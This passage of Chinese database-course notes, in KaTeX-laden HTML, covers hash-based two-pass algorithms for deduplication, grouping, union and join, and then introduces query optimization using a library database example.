reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span><span class="mord mtight">.</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span><span class="mrel mtight">=</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span><span class="mord mtight">.</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq><ul><li>第一趟：划分R和S的子表并进行子表排序，排序均基于Y属性排序</li><li>第二趟，归并时注意是R的输入还是S的输入。R和S的两路输入之间进行连接检查后连接后输出</li><li>又称“排序-连接”算法</li></ul></li></ul><h3 id="2004-%E5%9F%BA%E4%BA%8E%E6%95%A3%E5%88%97%E7%9A%84%E4%B8%A4%E8%B6%9F%E6%89%AB%E6%8F%8F%E7%AE%97%E6%B3%95" tabindex="-1">2004 基于散列的两趟扫描算法</h3><h4 id="%EF%BC%881%EF%BC%89%E5%9F%BA%E6%9C%AC%E6%80%9D%E6%83%B3" tabindex="-1">（1）基本思想</h4><ul><li>第一趟：散列子表，用散列函数<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">h_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq>将原始关系划分为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">M-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></eq>个子表并存储（剩一个用来输出）</li><li>第二趟：处理每个子表，用另一散列函数<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mi>r</mi></msub></mrow><annotation encoding="application/x-tex">h_r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>将子表读入内存并建立内存结构，进行不同操作的处理</li></ul><h4 id="%EF%BC%882%EF%BC%89%E5%AE%9E%E4%BE%8B" tabindex="-1">（2）实例</h4><ul><li>去重复操作<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">H_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq>计算元组部分属性的值<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi><mi>M</mi></mrow><annotation encoding="application/x-tex">modM</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span></eq>,将可能重复的元组散列到同一子表中</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mi>r</mi></msub></mrow><annotation encoding="application/x-tex">H_r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>计算整个元组的值<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi><mi>M</mi></mrow><annotation encoding="application/x-tex">modM</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span></eq>，将可能重复的元组散列到同一内存中</li><li>元组在子表上不重复，则在大关系中不重复</li><li>算法复杂度：4B®</li></ul></li><li>分组操作<ul><li>第一趟：将原始关系通过<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">h_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq>散列成m-1个子表，并进行存储</li><li>第二趟：处理每个子表。将每个子表读入内存，并用另一函数<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mi>r</mi></msub></mrow><annotation encoding="application/x-tex">h_r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>形成散列数据结构，进行分组聚集操作。</li><li>应选择不同的<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mi>p</mi></msub><mo separator="true">,</mo><msub><mi>h</mi><mi>r</mi></msub></mrow><annotation encoding="application/x-tex">h_p,h_r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq></li></ul></li><li>并操作<ul><li>包的并无需两次，直接合并即可</li><li>集合的并需要两趟，需要去重复。</li><li>第一趟：以相同的散列函数将R和S形成M-2个子表<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">R_i,S_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq></li><li>第二趟：将<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">S_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>再整体散列读入内存中，再依次处理<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">R_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>的每一块，如判断<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">R_i,S_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>都出现元组t，则仅输出t的一个副本，否则输出<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub><mo separator="true">,</mo><mi>R</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">S_i,Ri</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">i</span></span></span></span></eq></li></ul></li><li>交叉操作类似并操作</li><li>连接操作<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><msub><mo>⋈</mo><mrow><mi>R</mi><mi mathvariant="normal">.</mi><mi>y</mi><mo>=</mo><mi>S</mi><mi mathvariant="normal">.</mi><mi>y</mi></mrow></msub><mi>S</mi></mrow><annotation encoding="application/x-tex">R\Join_{R.y=S.y} S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">⋈</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span><span class="mord mtight">.</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">=</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span><span class="mord mtight">.</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq></li><li>以连接属性Y作为散列关键字，设计散列函数</li><li>第一趟：使用相同的散列函数散列两个操作对象R和S，形成R1…Rm,S1…Sm</li><li>第二趟：将Si再整体散列读入到内存中，再依次处理Ri的每一块，进行连接</li></ul></li></ul><h2 id="%E7%AC%AC%E4%BA%94%E7%AB%A0-%E6%9F%A5%E8%AF%A2%E7%BC%96%E8%AF%91%E5%99%A8" tabindex="-1">第五章 查询编译器</h2><h3 id="2101-%E4%BB%80%E4%B9%88%E6%98%AF%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96" tabindex="-1">2101 什么是查询优化</h3><h4 id="%EF%BC%881%EF%BC%89%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96" tabindex="-1">（1）为什么需要查询优化</h4><ul><li>关系数据库的执行效率问题</li><li>关系代数操作执行次序对效率的影响</li></ul><h4 id="%EF%BC%882%EF%BC%89%E4%BB%80%E4%B9%88%E6%98%AF%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96" tabindex="-1">（2）什么是查询优化</h4><ul><li>如何使数据库查询时间最短</li><li>三个层面进行优化<ul><li>语义优化：利用模型的语义及完整性规则，优化查询</li><li>语法优化—逻辑层优化：利用语法结构，优化操作执行顺序</li><li>执行优化—物理层优化：存取路径和执行算法的选择与执行次序优化</li></ul></li></ul><h3 id="2102-%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96%E7%9A%84%E6%80%BB%E4%BD%93%E6%80%9D%E8%B7%AF" tabindex="-1">2102 查询优化的总体思路</h3><h4 id="%EF%BC%881%EF%BC%89%E8%AF%AD%E4%B9%89%E4%BC%98%E5%8C%96%E2%80%93%E5%86%85%E5%AE%B9%E7%AD%89%E4%BB%B7%E6%80%A7" tabindex="-1">（1）语义优化–内容等价性</h4><p>sql层优化，不在这里进行讨论，此处需要用户取想办法，相关研究再进行了</p><h4 id="%EF%BC%882%EF%BC%89%E8%AF%AD%E6%B3%95%E4%BC%98%E5%8C%96%EF%BC%88%E9%80%BB%E8%BE%91%E5%B1%82%E4%BC%98%E5%8C%96%EF%BC%89%E2%80%93%E5%86%85%E5%AE%B9%E7%AD%89%E4%BB%B7%E6%80%A7" tabindex="-1">（2）语法优化（逻辑层优化）–内容等价性</h4><ul><li>基本思想：改变关系代数的操作次序：尽可能地早做选择和投影运算</li><li>关系代数地五种基本操作中哪些能够交换次序</li><li>次序变化前后两个表达式地等价性问题</li><li>关系代数表达式的等价变换定理及证明（略）</li><li>关系代数表达式的优化算法？逻辑查询计划形成</li></ul><h4 id="%EF%BC%883%EF%BC%89%E6%89%A7%E8%A1%8C%E4%BC%98%E5%8C%96%EF%BC%88%E7%89%A9%E7%90%86%E5%B1%82%E4%BC%98%E5%8C%96%EF%BC%89" tabindex="-1">（3）执行优化（物理层优化）</h4><ul><li>获取数据库的相关信息（定期统计）</li><li>实现同一关系操作的不同例行程序</li><li>选择相应的例行程序</li><li>依据相关信息进行代价估算，选择代价最少的例行程序及确定相应的参数</li><li>形成查询计划：以基本的例行程序为基本，确定这些例行程序的执行顺序</li></ul><h4 id="%EF%BC%884%EF%BC%89%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96%E7%9A%84%E6%80%BB%E8%BF%87%E7%A8%8B" tabindex="-1">（4）查询优化的总过程</h4><ul><li>用户书写sql语言</li><li>转化为关系代数</li><li>逻辑查询计划–逻辑层优化<ul><li>关系代数操作顺序的优化</li></ul></li><li>物理查询计划–物理层优化<ul><li>代价估算</li><li>算法选择与装配次序</li></ul></li><li>由执行引擎解释并调用算法（程序）予以执行</li></ul><h3 id="2103-%E9%80%BB%E8%BE%91%E5%B1%82%E4%BC%98%E5%8C%96%E7%AD%96%E7%95%A5" tabindex="-1">2103 逻辑层优化策略</h3><h4 id="%EF%BC%881%EF%BC%89%E4%B8%80%E4%B8%AA%E5%BE%85%E4%BC%98%E5%8C%96%E7%9A%84%E5%AE%9E%E4%BE%8B%E8%83%8C%E6%99%AF" tabindex="-1">（1）一个待优化的实例背景</h4><p>考虑一个图书馆的关系数据库<br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mi>O</mi><mi>O</mi><mi>K</mi><mi>S</mi><mo stretchy="false">(</mo><mi>T</mi><mi>U</mi><mi>T</mi><mi>L</mi><mi>E</mi><mo separator="true">,</mo><mi>A</mi><mi>U</mi><mi>T</mi><mi>H</mi><mi>O</mi><mi>R</mi><mo separator="true">,</mo><mi>P</mi><mi>N</mi><mi>A</mi><mi>M</mi><mi>E</mi><mo separator="true">,</mo><mi>L</mi><mi>C</mi><mi mathvariant="normal">_</mi><mi>N</mi><mi>O</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">BOOKS(TUTLE,AUTHOR,PNAME,LC\_NO)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">BOO</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.00773em;">OR</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">PN</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">ME</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">NO</span><span class="mclose">)</span></span></span></span></eq><br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>N</mi><mi>A</mi><mi>M</mi><mi>E</mi></mrow><annotation encoding="application/x-tex">PNAME</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">PN</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">ME</span></span></span></span></eq>为出版社名，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>C</mi><mi mathvariant="normal">_</mi><mi>N</mi><mi>O</mi></mrow><annotation encoding="application/x-tex">LC\_NO</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9933em;vertical-align:-0.31em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">NO</span></span></span></span></eq>为图书馆图书编号<br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>U</mi><mi>B</mi><mi>L</mi><mi>I</mi><mi>S</mi><mi>H</mi><mi>E</mi><mi>R</mi><mi>S</mi><mo stretchy="false">(</mo><mi>P</mi><mi>N</mi><mi>A</mi><mi>M</mi><mi>E</mi><mo separator="true">,</mo><mi>P</mi><mi>A</mi><mi>D</mi><mi>D</mi><mi>R</mi><mo separator="true">,</mo><mi>P</mi><mi>C</mi><mi>I</mi><mi>T</mi><mi>Y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">PUBLISHERS(PNAME,PADDR,PCITY)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.05764em;">ERS</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">PN</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">ME</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.02778em;">DD</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span></eq><br>出版社名字，出版社地址，出版社城市<br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mi>O</mi><mi>R</mi><mi>R</mi><mi>O</mi><mi>W</mi><mi>E</mi><mi>R</mi><mi>S</mi><mo stretchy="false">(</mo><mi>N</mi><mi>A</mi><mi>M</mi><mi>E</mi><mo separator="true">,</mo><mi>A</mi><mi>D</mi><mi>D</mi><mi>R</mi><mo separator="true">,</mo><mi>C</mi><mi>I</mi><mi>T</mi><mi>Y</mi><mo separator="true">,</mo><mi>C</mi><mi>A</mi><mi>R</mi><mi>D</mi><mi mathvariant="normal">_</mi><mi>N</mi><mi>O</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">BORROWERS(NAME,ADDR,CITY,CARD\_NO)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">BORRO</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.05764em;">ERS</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">ME</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.02778em;">DD</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">NO</span><span class="mclose">)</span></span></span></span></eq><br><eq><span class="katex"><span class="katex-mathml"><math 